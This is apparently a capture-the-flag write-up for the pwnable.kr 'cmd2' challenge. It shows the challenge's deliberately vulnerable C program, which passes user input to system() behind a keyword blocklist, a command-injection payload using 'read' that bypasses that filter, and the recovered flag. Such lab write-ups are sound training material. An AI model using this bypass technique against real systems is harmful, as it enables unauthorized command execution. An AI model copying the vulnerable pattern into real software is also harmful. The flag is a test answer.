dalal@ItamarLaptop:/mnt/c/Users/dalal/desktop/private_projects$ ssh cmd2@pwnable.kr -p2222
cmd2@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have new mail.
Last login: Fri Jul 19 16:17:06 2024 from 147.235.201.104
cmd2@pwnable:~$ cat cmd2.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}

cmd2@pwnable:~$ ./cmd2 '$(read input; echo $input)'
$(read input; echo $input)
/bin/cat flag
FuN_w1th_5h3ll_v4riabl3s_haha

explanation:
The trick with this challenge is writing "/bin/cat flag" without using '/' and 'flag' (and I can't use env variables).
After some thought, I understood that I needed to pass it in runtime, after the execution of the filter function.
An easy way to do it is by using the "read" command. With this command, I can write "/bin/cat flag" and then pass it to the "system" function for execution.
It took me a long time to realize that I needed to use single quotes instead of double quotes. Double quotes run the command even before calling the main function, so it will not pass the filter function. Instead, I want to pass it as a string literal, and then the "system" function will first run the "read" command, and the "echo" command will pass the "/bin/cat flag" to the "system" function for the real execution.